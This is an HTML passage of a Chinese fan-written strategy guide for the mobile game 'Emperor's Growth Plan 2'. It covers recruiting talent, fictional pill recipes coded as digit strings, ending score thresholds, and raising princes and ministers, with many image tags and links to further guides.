rel=\"nofollow noreferrer\">帝成攻略——特殊事件、人物</a><p><img src=\"https://pic1.zhimg.com/v2-d7b3b268caea7d8b3b50eece7a79214d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"1140\" data-watermark=\"watermark\" data-original-src=\"v2-d7b3b268caea7d8b3b50eece7a79214d\" data-watermark-src=\"v2-6858520aaf4fbf85bb7a09d4ffc0c4d8\" data-private-watermark-src=\"v2-c119aac05a0555913b33162d9789ed7f\"></p>\n<p>可从路人获取的东厂线索合集：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-83d8b2a08b825bad522f08d23c3a6000_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"627\" data-rawheight=\"694\" data-watermark=\"watermark\" data-original-src=\"v2-83d8b2a08b825bad522f08d23c3a6000\" data-watermark-src=\"v2-af894712fdeeda3aed03cb97e9956a1d\" data-private-watermark-src=\"v2-84e66e361336f482d9e74b4554b92162\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ea20f2d354dfc35d739e15dbef7f825e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1346\" data-watermark=\"watermark\" data-original-src=\"v2-ea20f2d354dfc35d739e15dbef7f825e\" data-watermark-src=\"v2-a31ce9b2d79db0c03e3ac260c11282a9\" data-private-watermark-src=\"v2-142c76356efb91f639444dc727fd500c\"></p>\n<p>皇帝的成长计划2吧 来自 素素偶的 的总结</p>\n<p><img src=\"https://pic1.zhimg.com/v2-610ec057f01a02b83774ba74322ccbce_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"799\" data-watermark=\"watermark\" data-original-src=\"v2-610ec057f01a02b83774ba74322ccbce\" data-watermark-src=\"v2-13954aa6a9be75ac19d44a4b4dbea8fd\" data-private-watermark-src=\"v2-791268d0073f17fa6eda6aab5051439a\"></p>\n<p>皇帝的成长计划2吧 来自 叶子风气质大叔 的总结</p>\n<p><b><i>包打听找随从</i></b></p>\n<p>注意事项：</p>\n<p>1、职业只代表出现人才的几率，不代表一定出现人才</p>\n<p>2、职业称谓和询问结合来看</p>\n<p>3、询问的适合文武最好要区分开来，根据常识做一些判断，例如山贼这些职业后千万不要去选道德或者文学，落榜书生什么的也不用选武术了</p>\n<p>4、sl才是避免错过人才的王道</p>\n<p>5、介绍名臣就直接录用吧，名臣会直接进入朝廷，而普通随从只会进入东厂</p>\n<p>职业称谓：</p>\n<p>S级:江湖隐士，武林隐士</p>\n<p>(基础属性强，尤其道德普遍都不低，就算是非酋，选它人才都差不到哪里去，出极品的概率高,人才属性一般情况下轻松破85)</p>\n<p>A级:突厥彪骑，突厥射手，东瀛忍者，漠北刀客，民间文豪，大家才子，史学家等</p>\n<p>B级:绿林好汉，江湖义士，独行侠，雇佣军，退役军人，山贼当家，落榜书生，诗人</p>\n<p>C级:各种商人（骏马、盐市、木材、兵器等等)</p>\n<p> (基础素质类似科举人员，感觉出极品的概率比D级那些要低，适合用来做贸易）</p>\n<p>D级:逃狱犯，采花贼，江湖神棍，醉酒大汉</p>\n<p>（如果询问武艺的话，出人才的概率要大于C级）</p>\n<p>询问等级：</p>\n<p>文武</p>\n<p>S级:天生神力、天赋异禀</p>\n<p>A级:这样的天赋简直让人过目不忘，真是登峰造极啊，这人的前途真是让人期待</p>\n<p>B级:一点都不比朕的侍卫差，还不错回答的也算巧妙</p>\n<p>C级:真是浪费我时间，差强人意，这个真不会被一拳撂倒, 感觉连自己都保护不了,勉勉强强把，浪得虚名等等</p>\n<p>道德</p>\n<p>S级:真是菩萨心肠,得道高僧</p>\n<p>A级:此人还真是让人期待</p>\n<p>B级:勉勉强强吧，道德观还算正常，只能算是善良之人吧，只有山贼会这么回答吧</p>\n<p>C级:贪污无德之人想必都会这么说吧</p>\n<p>D级:简直是个人渣,这也算人，最多做到管好自己吧</p>\n<p>（关于包打听出现的时间、地点前面已经说过了，再啰嗦一遍：包打听会在每年春季上旬（一月）和秋季上旬（七月）出现，在京城的一品楼，包打听会推荐各种各样的人才，运气好可以遇到名臣。）</p>\n<hr>\n<h2><b>二、青炉房(炼制丹药)</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/fve_GUNi9Zpit5IdwSyg0A\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-cfed8ab18ead1a0e476c8ec6c3d506e6_bh.jpg\" data-image-width=\"864\" data-image-height=\"368\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——丹药</a><p><b>​</b>注意事项：</p>\n<p>1、我认为获取丹药的大头是青炉房自动炼制的，这并不消耗药材所以尽量保持炼药经费富足（有条件就去工部建造一些增加产量的建筑吧）</p>\n<p>2、二月你去一品楼找道士前，你在青炉房炼什么药，他就会给你什么药（第五年起每年2月一品楼会给你一枚丹药，第一次为天地长寿丹，还会给你一颗你正在炼的丹药，不会提示，但丹药列表是会有的）</p>\n<p>3、按药方炼制，是有概率失败的，耗时为2回合，注意sl</p>\n<p><br></p>\n<p>药材序号:</p>\n<p>1、不化神冰；2、千年参王；3、鲸王凝脂；4、高僧舍利；5、龙蜒麝香；</p>\n<p>6、玉面首乌；7、五彩雪莲；8、透光灵芝；9、炽火金蟾；A、灵龟板；</p>\n<p>B、黄金锦鲤；C、天青水玉</p>\n<p><br></p>\n<p>固定丹药配方:（为官方破损药方内容）</p>\n<p>延年益寿丹1345967</p>\n<p>天地长寿丹7674823</p>\n<p>易容方       8989436</p>\n<p>奇妙面膜    9877512(每回合西市——胭脂铺有概率刷）</p>\n<p>麝香           5652595</p>\n<p>蕴毒丹       2347891</p>\n<p>九转迷魂香 432511</p>\n<p>速孕汤       6457933(每回合西市——济世堂有概率刷）</p>\n<p>安胎丸        8379122 </p>\n<p>避子汤        5559992 </p>\n<p>多胞胎药丸 6453777 (每回合西市——济世堂有概率刷）</p>\n<p>天机丹        B498165</p>\n<p>萱草丹        C984914</p>\n<p>冰糖梨汤    1111111</p>\n<p>丰胸木瓜丸（丰胸贴） 8679132</p>\n<p>人杰丹        A378915</p>\n<p>勇武丹        A629549</p>\n<p>博学丹        B561316</p>\n<p>才艺丹        C989466</p>\n<p>魅力丹        C312846</p>\n<p><br></p>\n<p>丹药作用:</p>\n<p>加寿命:</p>\n<p>*天地长寿丹 (增加两年寿命)</p>\n<p>*延年益寿丹 (增加一年寿命)</p>\n<p>*易容方（可以随机更换妃子/公主/皇子等立绘）</p>\n<p>*奇妙面膜（更换指定立绘）</p>\n<p>变声丸(每回合西市——济世堂有概率刷）</p>\n<p><br></p>\n<p>增加怀孕几率：</p>\n<p>1、壮阳药(皇帝吃) :生鹿血、三鞭酒、十鞭酒、虎鞭酒、大力丸</p>\n<p>2、春药(妃子吃) :春水丸、硬化香蕉</p>\n<p>3、春药(男女都可吃) :*九转迷魂香、阴阳散、得春丹、曼陀罗、十香散、遇仙丹、合欢散</p>\n<p>关于妃子怀孕用品:</p>\n<p>1、*速孕汤（妃子立即怀孕，包括男宠）</p>\n<p>2、*安胎丸（妃子不会难产或小产）</p>\n<p>3、*麝香（妃子滑胎)</p>\n<p>4、*避子汤（使用后大概率永远不孕）</p>\n<p>5、*多胞胎药丸（使用后妃子生下多胞胎，具体是几胎看运气，2~7）</p>\n<p>6、*天机丹（怀孕妃子吃了增加孩子属性)</p>\n<p>7、*萱草丹（怀孕妃子吃了必生皇子）</p>\n<p>平常的治病丹药:</p>\n<p>1、丹类:洗骨丹、惊寒丹、玄元丹、黄莲消火丹、小还丹、大还丹、赤血丹、浑天丹、桂圆丹、凝碧丹、化淤丹、罗厄丹、广陵丹、紫苏丹、还阳丹、辟灵丹、养魂丹、灵魂丹、聚魂丹、狮虎丹、长生丹、长命丹、回春丹、无极丹</p>\n<p>2、散类:去咳散、活血散、开脾散、黑玉断续散、太虚散、软金散、胡姜止咳散、玉壶散、磐石散、归心散</p>\n<p>3、丸类:牛黄上清丸、清瑶丸、三黄消火丸、熊胆丸、五补丸、蛇胆丸、碧髓丸、续命丸</p>\n<p>4、汤类:*冰糖梨汤、华参汤、青莲补汤、五籽汤</p>\n<p>5、花草类:芝雪草、金银花、醒酒花、云霖花、龙葵花</p>\n<p>6、露类:三清露、清寂露、核桃露</p>\n<p>7、其它:千金藤、星辰蓝、去癀片、千幻伽蓝、青龙参、生精酒、醉仙灵芙、金疮药、天香豆蔻</p>\n<p>毒药:（驿馆——苗女可花费20W购买毒药）</p>\n<p>*蕴毒丹、夹竹桃汤、橙林丹、含笑半步颠、雷藤散、五毒丸、六步散、七步散、断情花散、断肠草汤、鸩酒</p>\n<p>回复类:</p>\n<p>1、回神丸（回复体力）</p>\n<p>2、凝神丸（回复健康）</p>\n<p>3、开智丸（增加智慧）</p>\n<p>*增加属性：</p>\n<p>1、人杰丹（本回合增长的属性翻倍,包括皇威)</p>\n<p>2、勇武丹（自己吃+30武力，送大臣/皇子+3)</p>\n<p>3、博学丹（自己吃+30文学，送大臣/皇子+3）</p>\n<p>4、才艺丹（自己吃+30才艺，送大臣/皇子+3）</p>\n<p>5、加（妃子/公主）魅力:</p>\n<p>*丰胸木瓜丸、丰胸贴、木瓜美容丸、养颜丹</p>\n<p>*魅力丹（1回合内养心殿休息，宫女必定爬床；2回合内，巡游发现名妃几率提高)</p>\n<p>药材获取：</p>\n<p>1、出游可获得新药材</p>\n<p>颐和园——A</p>\n<p>圆明园——B</p>\n<p>避暑山庄——C</p>\n<p>2、郊外（随机药材）</p>\n<p>围猎 低几率</p>\n<p>钓鱼 高概率</p>\n<p>3、礼部向臣属国/联盟国 索要（随机） （联盟国不一定给）</p>\n<p>一年一度的生辰附属国（高丽国等）/知府进贡（随机）</p>\n<p>4、每年7月份 京城——角落的人（随机）</p>\n<p>5、工部建造百草园（每年随机产出一个）</p>\n<p><br></p>\n<hr>\n<h2><b>三、选官</b></h2>\n<p><img src=\"https://pic1.zhimg.com/v2-d1f2cd13f09ead84479599cb5f0b687d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"723\" data-watermark=\"watermark\" data-original-src=\"v2-d1f2cd13f09ead84479599cb5f0b687d\" data-watermark-src=\"v2-92b580fe2ed1c78191ac2d47a9c2e385\" data-private-watermark-src=\"v2-bfe111f7abcf2b05d8f6b2798998c0bc\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d7a67d3b212efcd6bb93182455fdcae7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"546\" data-rawheight=\"508\" data-watermark=\"watermark\" data-original-src=\"v2-d7a67d3b212efcd6bb93182455fdcae7\" data-watermark-src=\"v2-642404d91ceeb1a401a615d5cf1b47f3\" data-private-watermark-src=\"v2-119e5856409f498d44ad37ecfce8c5c1\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8626a5c1e61f549d014cea99b6bbf112_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1629\" data-rawheight=\"1133\" data-watermark=\"watermark\" data-original-src=\"v2-8626a5c1e61f549d014cea99b6bbf112\" data-watermark-src=\"v2-ab8bf512ca2c3ccc5ac0966023f078ae\" data-private-watermark-src=\"v2-9d94bf6e6b62fca544346ead9506ce69\"></p>\n<p><br></p>\n<hr>\n<h2><b>四、结局评分</b></h2>\n<p><img src=\"https://pic2.zhimg.com/v2-13cd4d5c8c520bcf9425fafa70439d87_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"20959\" data-watermark=\"watermark\" data-original-src=\"v2-13cd4d5c8c520bcf9425fafa70439d87\" data-watermark-src=\"v2-12f0b9b4162d9f845ef692b6ebe243be\" data-private-watermark-src=\"v2-56d4b9e8bdcae69ca26c6d7bb65fa0fe\"></p>\n<p>三十年去一品楼——游者司马评分标准：</p>\n<p>【文化】</p>\n<p>落后文明：文化分小于5w分</p>\n<p>文化启蒙：评分大于等于5w分，小于12w</p>\n<p>文化进步：评分大于等于12w分，小于30w</p>\n<p>高度文明：评分大于等于30w分，小于200w</p>\n<p> 【经济】</p>\n<p>经济落后：经济分小于5w分</p>\n<p>经济开放：评分大于等于5w分，小于12w</p>\n<p>小康社会：评分大于等于12w分，小于30w</p>\n<p>繁荣富强：评分大于等于30w分，小于200w</p>\n<p> 【军事】</p>\n<p>军事薄弱：军事分小于5w分</p>\n<p>军事起步：评分大于等于5w分，小于12w</p>\n<p>稳中求胜：评分大于等于12w分，小于30w</p>\n<p>兵强马壮：评分大于等于30w分，小于200w</p>\n<p><img src=\"https://pic2.zhimg.com/v2-958400a3493ecaa2663c7997f31775e6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-958400a3493ecaa2663c7997f31775e6\" data-watermark-src=\"v2-f263306e2fb9ac8a828dadcf63c43999\" data-private-watermark-src=\"v2-ecfad40e4bf2ef944f0984b5282356cb\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0c4e2eb9f60e7d503f152ac8cdfc2c13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"875\" data-rawheight=\"1776\" data-watermark=\"watermark\" data-original-src=\"v2-0c4e2eb9f60e7d503f152ac8cdfc2c13\" data-watermark-src=\"v2-418b6a82ade4174dcefa18cdc1955284\" data-private-watermark-src=\"v2-7bd9c4ba0d95b5741b30d9bdaa18a157\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6182084056b9b75b02c54a91b8d9b918_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1795\" data-rawheight=\"557\" data-watermark=\"watermark\" data-original-src=\"v2-6182084056b9b75b02c54a91b8d9b918\" data-watermark-src=\"v2-bdfa0dccf77c3343b3c817cf2b05ba86\" data-private-watermark-src=\"v2-1e838fdae2450df1920a555c5997e86f\"></p>\n<hr>\n<h2><b>五、培育皇子</b></h2>\n<p>如果要立的皇子不是第一顺位 那就把前面的皇子派出去就可以啦(策卡——内阁制可以任意指定)</p>\n<p><img src=\"https://pic4.zhimg.com/v2-31a2a4c34febf9dbc43381cd185549c0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"504\" data-rawheight=\"505\" data-watermark=\"watermark\" data-original-src=\"v2-31a2a4c34febf9dbc43381cd185549c0\" data-watermark-src=\"v2-a2e8e2420fcdfc0455fa46a5852e49e3\" data-private-watermark-src=\"v2-0b4d0659ce31289a551b72bec1e75274\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-09f669ac27827eaabba7406aabcbb1e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"740\" data-rawheight=\"249\" data-watermark=\"watermark\" data-original-src=\"v2-09f669ac27827eaabba7406aabcbb1e7\" data-watermark-src=\"v2-c4e28532d42698fbfc8eb9b844a4b958\" data-private-watermark-src=\"v2-77218b22cfd90ba021ce3ee61ba725b3\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7fabcbce148d5e8f1b9f6d547802bb13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"408\" data-rawheight=\"130\" data-watermark=\"watermark\" data-original-src=\"v2-7fabcbce148d5e8f1b9f6d547802bb13\" data-watermark-src=\"v2-60da88553555bcf605cf709dbb7288f0\" data-private-watermark-src=\"v2-e75d71811eb8d0e0991f181ad3d10633\"></p>\n<p><br></p>\n<hr>\n<h2><b>六、培育近臣</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/5TFZOeXT8R401bXcVAmH5w\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-e85fd17598761274ba015a8555854042_l.jpg\" data-image-width=\"534\" data-image-height=\"533\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——近臣的作用篇</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/MY1lBQo5JjkS9odzfqLmNQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-347764592a9e34e86c096e6443e13b5f_l.jpg\" data-image-width=\"540\" data-image-height=\"540\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——大臣性格相关</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/jXJqUBWr5UlV6xcLE_E0mw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-be372776681aac9f188f2a2a0b6c39ed_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——近臣培育方法篇</a><p><img src=\"https://pic1.zhimg.com/v2-0e76871d7657509e0dc42b26869704f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-0e76871d7657509e0dc42b26869704f3\" data-watermark-src=\"v2-3574b161d9eb6974e36383ad0a094d89\" data-private-watermark-src=\"v2-212f80b298f92757252e9fa505760899\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-6496535fc98603e64453f872436d30c9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-6496535fc98603e64453f872436d30c9\" data-watermark-src=\"v2-77966a15a6194018d6193cd8aabc25b8\" data-private-watermark-src=\"v2-667156cee7a0c0458618cde5580ea1b3\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2a548a169d54f438a5ee38f3bd8069db_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-2a548a169d54f438a5ee38f3bd8069db\" data-watermark-src=\"v2-81b120a6b3580b2fc69f7c7e5fa38b4e\" data-private-watermark-src=\"v2-12d063e4f5bd69830c6f1addaeb34081\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d8da9fc4aa8b58248cd1c3c2af016447_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-d8da9fc4aa8b58248cd1c3c2af016447\" data-watermark-src=\"v2-8075dd75efe28e5067a723c599f8ecff\" data-private-watermark-src=\"v2-ab58bedf098e955c5eae3f0774a0290e\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1d517632bfa9f8cdf1deb2ec0823f305_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-1d517632bfa9f8cdf1deb2ec0823f305\" data-watermark-src=\"v2-184a2368d87db9c91ceb51d9ad80a175\" data-private-watermark-src=\"v2-b84e952802db62629bbb0b835ffa8172\"></p>\n<hr>\n<h2><b>七、大雁塔玩法</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/EKGQXdpZ-ku8RGzcddwiaQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-8423e82cd3d667f5001f4fd2cbef3703_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——大雁塔</a><p><img src=\"https://pic1.zhimg.com/v2-45b5892d0e94a14b306cbac45a326315_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"699\" data-watermark=\"watermark\" data-original-src=\"v2-45b5892d0e94a14b306cbac45a326315\" data-watermark-src=\"v2-fadd429224426c1b861fd40d8a7226bd\" data-private-watermark-src=\"v2-61375389877304964126f402a6acecc5\"></p>\n<hr>\n<h2><b>八、六尚局</b></h2>\n<h3><b>（一）宫正司</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/zCXaS1bI4C1bc7Xr4P6FRQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-196c26eb3dfc81eb4006d0a48b9fb46c_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——宫正司</a><h3><b>（二）尚功局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/EngORFqdwbgyDwmpOmonAw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-e5e702a53ee296024b54e63e4f96484e_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚功局</a><h3><b>（三）尚宫局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/rKOlExMvYU7FCU_Z4S-Q-Q\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-8fa559a68962f8db59caf105d8c84681_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚宫局</a><h3><b>（四）尚仪局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/eVs4jFoKh_wbVnWeW_u2cg\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-7dc0f1edd36dbdbe3674e06694cd0313_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚仪局</a><h3><b>（五）尚食局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/dEg4Ncn-kBxKIcwWw2_VEQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-1cf98f52913dedf2cba103d06e79fefe_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚食局（一）</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/U-hQ6mfScTMmZz-cK-JefQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-0927d1adecb72d37b084ecc3b191f4e3_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚食局（二）</a><p><img src=\"https://pic3.zhimg.com/v2-edce438be3b4efc88ad67125b513fe06_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2388\" data-watermark=\"watermark\" data-original-src=\"v2-edce438be3b4efc88ad67125b513fe06\" data-watermark-src=\"v2-756e2bf45d07dcd507feedb087187cc2\" data-private-watermark-src=\"v2-0a93355311773bbdb5667ba73a9dae29\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-28387dac78b03cc6f64ed0066db1fb84_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"4006\" data-watermark=\"watermark\" data-original-src=\"v2-28387dac78b03cc6f64ed0066db1fb84\" data-watermark-src=\"v2-6c0545cfcea1f66aa2900a7236b8a37e\" data-private-watermark-src=\"v2-88c316e4485f87dd3ec2696f850ef4c7\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b931fa449c02f64b5b039ba7c64eb4ef_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-b931fa449c02f64b5b039ba7c64eb4ef\" data-watermark-src=\"v2-2b4b2284b14a24c9ec27326505d68761\" data-private-watermark-src=\"v2-4ec4326331c6a2ff17056d3209227cde\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5361c22365683616085c99fc08c204bf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-5361c22365683616085c99fc08c204bf\" data-watermark-src=\"v2-de9b9dd5bab37f0dabe2830924d2b458\" data-private-watermark-src=\"v2-8bfabc18354a1f61c1dd2bab8dd9c92e\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0d9dcd065e842ec893df455eafdcbcba_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-0d9dcd065e842ec893df455eafdcbcba\" data-watermark-src=\"v2-74f624857cf6a85e23e59cea84afb4ce\" data-private-watermark-src=\"v2-4603adf3e7f7311e0a5dffdd83d8a172\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-493954ecfdc712036673414bd2b58640_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1170\" data-watermark=\"watermark\" data-original-src=\"v2-493954ecfdc712036673414bd2b58640\" data-watermark-src=\"v2-52fd07f6f42fcd7d4d8ddde32101b0d3\" data-private-watermark-src=\"v2-8661984a456b497360e50992c36cbc10\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f3f28ac9bcc4e74000ba20e2a3386ddc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1203\" data-watermark=\"watermark\" data-original-src=\"v2-f3f28ac9bcc4e74000ba20e2a3386ddc\" data-watermark-src=\"v2-80ae074f25785519d0dcc2242be9d972\" data-private-watermark-src=\"v2-8a45971d10a7943c8787bb8a33f2932d\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d9577838ba51ba1c06160a16ad450d53_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1236\" data-watermark=\"watermark\" data-original-src=\"v2-d9577838ba51ba1c06160a16ad450d53\" data-watermark-src=\"v2-5917e4ada9c72562daa05885763242fc\" data-private-watermark-src=\"v2-b7fcaa56c04db716f6fd4437b0551931\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c05b1a274d61bea2ea7f17ae37235951_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"582\" data-watermark=\"watermark\" data-original-src=\"v2-c05b1a274d61bea2ea7f17ae37235951\" data-watermark-src=\"v2-ee4e1b2fcdee2bef2cf43e7ca00a57f7\" data-private-watermark-src=\"v2-1b63ccf0bafbc6e4cbde8c58b39bcdd0\"></p>\n<hr>\n<h2><b>九、东厂线索合集</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/GNVps2comkQYKAcg6vFjCw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-6981a4aa542a001192b905caea0f24cf_l.jpg\" data-image-width=\"455\" data-image-height=\"455\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——路人线索篇</a><hr>\n<h2>十、密探</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/a3qSHW5D3WnAYdMpLexX_A%3Fscene%3D21%23wechat_redirect\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-edf25d94ab427dc72502d4d393bf9be4_bh.jpg\" data-image-width=\"1105\" data-image-height=\"471\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——密探</a><hr>\n<h2>十一、皇子珍宝</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/kA5uXY4t6-F-ctJPH7YJDA\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-388bb2ea6feaa24c2d63e058ae835cbe_bh.jpg\" data-image-width=\"1232\" data-image-height=\"524\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——皇子珍宝</a><hr>\n<h2>十二、飞贼</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/k7X55B4k4VDnnypFozL_yQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-a9f278a78af6f3afe1aa95cfdb579ddb_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——飞贼</a><hr>\n<h2>十三、策卡推荐（待更中）</h2>\n<h3>（一）五行谶纬</h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Bc_cT87uXv55VP15OwK_sg\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-40e2b0daaec64171783afca2bcbac268_bh.jpg\" data-image-width=\"1206\" data-image-height=\"513\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow 